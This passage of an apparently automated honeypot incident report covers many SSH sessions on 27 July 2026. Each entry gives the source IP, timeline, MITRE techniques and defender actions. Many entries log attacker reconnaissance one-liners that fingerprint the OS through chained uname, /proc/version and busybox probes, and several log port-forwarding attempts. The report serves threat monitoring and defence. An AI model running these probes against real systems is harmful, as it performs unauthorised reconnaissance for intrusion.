| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:50:19` | `cowrie.session.connect` |
| `2026-07-27 07:50:19` | `cowrie.client.version` |
| `2026-07-27 07:50:19` | `cowrie.client.kex` |
| `2026-07-27 07:50:20` | `cowrie.login.success` |
| `2026-07-27 07:50:20` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be873f835904

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:50 |
| **Last Seen** | 2026-07-27 07:51 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:50:36` | `cowrie.session.connect` |
| `2026-07-27 07:50:38` | `cowrie.client.version` |
| `2026-07-27 07:50:38` | `cowrie.client.kex` |
| `2026-07-27 07:50:48` | `cowrie.login.success` |
| `2026-07-27 07:51:08` | `cowrie.session.params` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.success` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:08` | `cowrie.command.input` |
| `2026-07-27 07:51:10` | `cowrie.log.closed` |
| `2026-07-27 07:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a540c39d3c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]158` |
| **First Seen** | 2026-07-27 07:51 |
| **Last Seen** | 2026-07-27 07:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:51:48` | `cowrie.session.connect` |
| `2026-07-27 07:51:48` | `cowrie.login.success` |
| `2026-07-27 07:51:49` | `cowrie.session.params` |
| `2026-07-27 07:51:49` | `cowrie.command.input` |
| `2026-07-27 07:51:50` | `cowrie.command.input` |
| `2026-07-27 07:51:50` | `cowrie.command.input` |
| `2026-07-27 07:51:51` | `cowrie.command.input` |
| `2026-07-27 07:51:51` | `cowrie.command.failed` |
| `2026-07-27 07:51:51` | `cowrie.log.closed` |
| `2026-07-27 07:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]158` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c968babd71

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-07-27 07:53 |
| **Last Seen** | 2026-07-27 07:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:53:16` | `cowrie.session.connect` |
| `2026-07-27 07:53:17` | `cowrie.client.version` |
| `2026-07-27 07:53:17` | `cowrie.client.kex` |
| `2026-07-27 07:53:18` | `cowrie.login.success` |
| `2026-07-27 07:53:18` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2062fb33906

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:53 |
| **Last Seen** | 2026-07-27 07:53 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:53:17` | `cowrie.session.connect` |
| `2026-07-27 07:53:22` | `cowrie.client.version` |
| `2026-07-27 07:53:22` | `cowrie.client.kex` |
| `2026-07-27 07:53:35` | `cowrie.login.success` |
| `2026-07-27 07:53:39` | `cowrie.session.params` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.success` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:39` | `cowrie.command.input` |
| `2026-07-27 07:53:40` | `cowrie.log.closed` |
| `2026-07-27 07:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf0a0b2fe7d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:56 |
| **Last Seen** | 2026-07-27 07:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:56:10` | `cowrie.session.connect` |
| `2026-07-27 07:56:11` | `cowrie.client.version` |
| `2026-07-27 07:56:11` | `cowrie.client.kex` |
| `2026-07-27 07:56:17` | `cowrie.login.success` |
| `2026-07-27 07:56:19` | `cowrie.session.params` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.success` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:19` | `cowrie.command.input` |
| `2026-07-27 07:56:20` | `cowrie.command.input` |
| `2026-07-27 07:56:20` | `cowrie.log.closed` |
| `2026-07-27 07:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174c967e974e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:58 |
| **Last Seen** | 2026-07-27 07:59 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:58:49` | `cowrie.session.connect` |
| `2026-07-27 07:58:51` | `cowrie.client.version` |
| `2026-07-27 07:58:51` | `cowrie.client.kex` |
| `2026-07-27 07:58:56` | `cowrie.login.success` |
| `2026-07-27 07:58:59` | `cowrie.session.params` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.success` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.command.input` |
| `2026-07-27 07:58:59` | `cowrie.log.closed` |
| `2026-07-27 07:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a4ffea1c93

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-07-27 08:00 |
| **Last Seen** | 2026-07-27 08:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:00:16` | `cowrie.session.connect` |
| `2026-07-27 08:00:17` | `cowrie.client.version` |
| `2026-07-27 08:00:17` | `cowrie.client.kex` |
| `2026-07-27 08:00:18` | `cowrie.login.success` |
| `2026-07-27 08:00:19` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca11ab1d01a4

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-07-27 08:00 |
| **Last Seen** | 2026-07-27 08:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:00:24` | `cowrie.session.connect` |
| `2026-07-27 08:00:25` | `cowrie.client.version` |
| `2026-07-27 08:00:25` | `cowrie.client.kex` |
| `2026-07-27 08:00:28` | `cowrie.login.success` |
| `2026-07-27 08:00:29` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb69f202c7f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:01 |
| **Last Seen** | 2026-07-27 08:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:01:25` | `cowrie.session.connect` |
| `2026-07-27 08:01:27` | `cowrie.client.version` |
| `2026-07-27 08:01:27` | `cowrie.client.kex` |
| `2026-07-27 08:01:31` | `cowrie.login.success` |
| `2026-07-27 08:01:34` | `cowrie.session.params` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.success` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.command.input` |
| `2026-07-27 08:01:34` | `cowrie.log.closed` |
| `2026-07-27 08:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a39d24fceda

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:04 |
| **Last Seen** | 2026-07-27 08:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:04:08` | `cowrie.session.connect` |
| `2026-07-27 08:04:09` | `cowrie.client.version` |
| `2026-07-27 08:04:09` | `cowrie.client.kex` |
| `2026-07-27 08:04:13` | `cowrie.login.success` |
| `2026-07-27 08:04:15` | `cowrie.session.params` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.success` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:15` | `cowrie.command.input` |
| `2026-07-27 08:04:17` | `cowrie.log.closed` |
| `2026-07-27 08:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-907d74fd0878

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:06 |
| **Last Seen** | 2026-07-27 08:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:06:50` | `cowrie.session.connect` |
| `2026-07-27 08:06:51` | `cowrie.client.version` |
| `2026-07-27 08:06:51` | `cowrie.client.kex` |
| `2026-07-27 08:06:54` | `cowrie.login.success` |
| `2026-07-27 08:06:56` | `cowrie.session.params` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.success` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:56` | `cowrie.command.input` |
| `2026-07-27 08:06:58` | `cowrie.log.closed` |
| `2026-07-27 08:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd0bc99c1cc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:09 |
| **Last Seen** | 2026-07-27 08:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:09:31` | `cowrie.session.connect` |
| `2026-07-27 08:09:33` | `cowrie.client.version` |
| `2026-07-27 08:09:33` | `cowrie.client.kex` |
| `2026-07-27 08:09:38` | `cowrie.login.success` |
| `2026-07-27 08:09:40` | `cowrie.session.params` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.success` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.command.input` |
| `2026-07-27 08:09:40` | `cowrie.log.closed` |
| `2026-07-27 08:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1aa674ba0e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:12 |
| **Last Seen** | 2026-07-27 08:12 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:12:10` | `cowrie.session.connect` |
| `2026-07-27 08:12:11` | `cowrie.client.version` |
| `2026-07-27 08:12:11` | `cowrie.client.kex` |
| `2026-07-27 08:12:17` | `cowrie.login.success` |
| `2026-07-27 08:12:22` | `cowrie.session.params` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.success` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:22` | `cowrie.command.input` |
| `2026-07-27 08:12:24` | `cowrie.log.closed` |
| `2026-07-27 08:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b537ffbde6

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-27 08:14 |
| **Last Seen** | 2026-07-27 08:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:14:05` | `cowrie.session.connect` |
| `2026-07-27 08:14:05` | `cowrie.client.version` |
| `2026-07-27 08:14:05` | `cowrie.client.kex` |
| `2026-07-27 08:14:08` | `cowrie.login.success` |
| `2026-07-27 08:14:08` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e3667a0697c

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-27 08:14 |
| **Last Seen** | 2026-07-27 08:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:14:18` | `cowrie.session.connect` |
| `2026-07-27 08:14:19` | `cowrie.client.version` |
| `2026-07-27 08:14:19` | `cowrie.client.kex` |
| `2026-07-27 08:14:20` | `cowrie.login.success` |
| `2026-07-27 08:14:21` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
